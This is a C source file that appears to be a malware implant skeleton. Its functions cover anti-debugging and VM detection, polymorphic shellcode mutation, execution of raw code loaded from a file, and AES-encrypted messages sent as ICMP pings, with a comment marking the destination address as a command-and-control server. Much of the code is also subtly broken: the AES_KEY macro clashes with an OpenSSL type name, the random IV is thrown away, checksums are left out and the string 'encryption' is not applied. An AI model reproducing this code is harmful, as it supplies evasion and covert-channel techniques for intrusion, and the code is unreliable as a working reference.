#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <time.h>

#define AES_KEY "0123456789abcdef"
#define SERVER_IP "127.0.0.1"
#define ICMP_PAYLOAD_SIZE 64

// Anti-Debugging Techniques
void anti_debug() {
    // Inline assembly for anti-debugging
    __asm__ __volatile__ (
        "xor %eax, %eax\n\t"
        "mov $0x1, %eax\n\t"
        "int $0x80\n\t"
        "cmp %eax, $0x0\n\t"
        "jne _debugged\n\t"
        "_not_debugged:\n\t"
        "jmp _end\n\t"
        "_debugged:\n\t"
        "mov $0x1, %eax\n\t"
        "int $0x80\n\t"
        "_end:\n\t"
    );

    // Check parent process ID
    if (getppid() != 1) exit(1);

    // Use ptrace to prevent debugging
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) exit(1);
}

// AES Encryption/Decryption
void aes_encrypt(unsigned char *plaintext, unsigned char *key, unsigned char *ciphertext) {
    AES_KEY enc_key;
    unsigned char iv[AES_BLOCK_SIZE];
    RAND_bytes(iv, AES_BLOCK_SIZE);
    AES_set_encrypt_key(key, 128, &enc_key);
    AES_cfb128_encrypt(plaintext, ciphertext, strlen((char *)plaintext), &enc_key, iv, NULL, AES_ENCRYPT);
}

void aes_decrypt(unsigned char *ciphertext, unsigned char *key, unsigned char *plaintext) {
    AES_KEY dec_key;
    unsigned char iv[AES_BLOCK_SIZE];
    AES_set_decrypt_key(key, 128, &dec_key);
    AES_cfb128_encrypt(ciphertext, plaintext, strlen((char *)ciphertext), &dec_key, iv, NULL, AES_DECRYPT);
}

// String Encryption and Decryption at Runtime
const char* enc_str = "\x53\x61\x6D\x70\x6C\x65"; // "Sample" XOR-ed with 0x20
const char k = 0x20;

char* decrypt_string(const char* enc_str) {
    size_t len = strlen(enc_str);
    char* dec_str = malloc(len + 1);
    for (size_t i = 0; i < len; i++) {
        dec_str[i] = enc_str[i] ^ k;
    }
    dec_str[len] = '\0';
    return dec_str;
}

// Check if Running in a VM
int check_vm() {
    FILE *f = fopen("/sys/class/dmi/id/product_name", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "VMware") || strstr(line, "VirtualBox")) {
                fclose(f);
                return 1;
            }
        }
        fclose(f);
    }
    return 0;
}

// Send ICMP Ping
void send_ping(const char *target_ip, const char *message) {
    int sockfd;
    struct sockaddr_in addr;
    struct icmp icmp_hdr;
    char buffer[ICMP_PAYLOAD_SIZE];

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &addr.sin_addr);

    memset(&icmp_hdr, 0, sizeof(icmp_hdr));
    icmp_hdr.icmp_type = ICMP_ECHO;
    icmp_hdr.icmp_code = 0;
    icmp_hdr.icmp_id = getpid();
    icmp_hdr.icmp_seq = 1;
    icmp_hdr.icmp_cksum = 0;

    memset(buffer, 0, sizeof(buffer));
    strcpy(buffer, message);

    memcpy(buffer, &icmp_hdr, sizeof(icmp_hdr));
    icmp_hdr.icmp_cksum = 0; // Add your checksum function here
    memcpy(buffer, &icmp_hdr, sizeof(icmp_hdr));

    if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&addr, sizeof(addr)) <= 0) {
        perror("Sendto failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    close(sockfd);
}

// Receive ICMP Ping
void receive_ping() {
    int sockfd;
    struct sockaddr_in addr;
    char buffer[1024];
    socklen_t addr_len;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    addr_len = sizeof(addr);
    if (recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&addr, &addr_len) <= 0) {
        perror("Recvfrom failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    struct icmp *icmp_hdr = (struct icmp*)(buffer + sizeof(struct iphdr));
    if (icmp_hdr->icmp_type == ICMP_ECHOREPLY) {
        printf("Received ICMP ECHO REPLY: %s\n", buffer + sizeof(struct iphdr) + sizeof(struct icmp));
    }

    close(sockfd);
}

// Polymorphic Shellcode Mutation
void mutate_shellcode(unsigned char* shellcode, size_t length) {
    srand(time(NULL));
    unsigned char key = rand() % 256;
    for (size_t i = 0; i < length; i++) {
        shellcode[i] = (shellcode[i] ^ key) << 1 | (shellcode[i] ^ key) >> 7;
    }
}

// Dynamic Code Loading Example
void load_and_execute_code() {
    // Example: Load code from a file and execute it
    FILE *f = fopen("code.bin", "rb");
    if (!f) return;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);

    unsigned char *code = malloc(size);
    fread(code, 1, size, f);
    fclose(f);

    void (*func)() = (void (*)())code;
    func();

    free(code);
}

// Task Execution with Control Flow Obfuscation
void execute_task(const char* task) {
    unsigned char key[16] = AES_KEY;
    unsigned char buffer[64];
    
    if (strcmp(task, "encrypt") == 0) {
        goto encrypt_label;
    } else if (strcmp(task, "decrypt") == 0) {
        goto decrypt_label;
    } else {
        goto unknown_task_label;
    }

encrypt_label:
    {
        unsigned char plaintext[64] = "Sensitive data";
        unsigned char ciphertext[64];
        aes_encrypt(plaintext, key, ciphertext);
        printf("Encrypted: %s\n", ciphertext);
        return;
    }

decrypt_label:
    {
        unsigned char ciphertext[64] = "EncryptedData";
        unsigned char plaintext[64];
        aes_decrypt(ciphertext, key, plaintext);
        printf("Decrypted: %s\n", plaintext);
        return;
    }

unknown_task_label:
    {
        printf("Unknown task\n");
        return;
    }
}

int main(int argc, char *argv[]) {
    anti_debug();
    
    if (check_vm()) {
        printf("Running in a VM. Exiting.\n");
        exit(1);
    }

    if (argc > 1) {
        execute_task(argv[1]);

        unsigned char shellcode[] = "\x31\xc0\xb0\x01\x31\xdb\xcd\x80";  // Example shellcode
        mutate_shellcode(shellcode, sizeof(shellcode) - 1);
        printf("Mutated Shellcode: ");
        for (size_t i = 0; i < sizeof(shellcode) - 1; i++) {
            printf("\\x%02x", shellcode[i]);
        }
        printf("\n");

        char encrypted_message[ICMP_PAYLOAD_SIZE];
        aes_encrypt((unsigned char*)argv[1], (unsigned char*)AES_KEY, (unsigned char*)encrypted_message);
        send_ping(SERVER_IP, encrypted_message);  // Replace with C2 server IP
        receive_ping();
    } else {
        printf("No task provided\n");
    }
    return 0;
}
